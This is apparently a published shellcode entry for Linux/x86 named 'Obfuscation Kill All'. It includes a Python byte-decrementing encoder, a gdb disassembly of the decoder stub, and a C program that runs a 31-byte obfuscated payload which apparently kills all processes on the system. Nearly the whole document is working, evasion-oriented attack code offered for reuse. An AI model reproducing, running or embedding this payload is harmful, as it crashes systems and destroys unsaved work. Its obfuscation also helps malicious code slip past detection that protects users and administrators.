Linux/x86 - Obfuscation Kill All

Greetz  :   Bomberman&T-Rex
Author  :   B3mB4m
Tested On : Kali 2.0


/*
#Do not test in your own OS#

http://linux.die.net/man/2/kill
The kill() system call can be used to send any signal to any process group or process.*/


def basicobcus(value):
	weird = ['0x%s' % x for x in  str(value).split("\\x") if x != ""]
	print "Lenght : %s" % len(weird)
	for x in xrange(0, len(weird)):
		print r"%s," % hex(int(int(weird[x], 16))-1),
	#Save ram into Opcode-1 list.
	#Run real shellcode into ram.
	#Basic but effective also working lol.

basicobcus(r"Shellcode");


Shellcode Length:  31

Breakpoint 1, 0x08049760 in code ()
(gdb) disassemble 
Dump of assembler code for function code:
=> 0x08049760 <+0>:		jmp    0x804976f <code+15>
   0x08049762 <+2>:		pop    %esi
   0x08049763 <+3>:		xor    %ecx,%ecx
   0x08049765 <+5>:		mov    $0xb,%cl
   0x08049767 <+7>:		addb   $0x1,(%esi)
   0x0804976a <+10>:	inc    %esi
   0x0804976b <+11>:	loop   0x8049767 <code+7>
   0x0804976d <+13>:	jmp    0x8049774 <code+20>
   0x0804976f <+15>:	call   0x8049762 <code+2>
   0x08049774 <+20>:	imul   $0x695afe69,(%edi,%edx,2),%esp
   0x0804977b <+27>:	or     %bl,-0x34(%eax)
   0x0804977e <+30>:	jg     0x8049780 <completed.6279>
End of assembler dump.
(gdb)


/* Encoded parts

   0x08049774 <+20>:	imul   $0x695afe69,(%edi,%edx,2),%esp
   0x0804977b <+27>:	or     %bl,-0x34(%eax)
   0x0804977e <+30>:	jg     0x8049780 <completed.6279>

*/


#include <stdio.h>
#include <string.h>

unsigned char code[] = "\xeb\x0d\x5e\x31\xc9\xb1\x0b\x80\x06\x01\x46\xe2\xfa\xeb\x05\xe8\xee\xff\xff\xff\x69\x24\x57\x69\xfe\x5a\x69\x08\x58\xcc\x7f";

main(){
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}

	
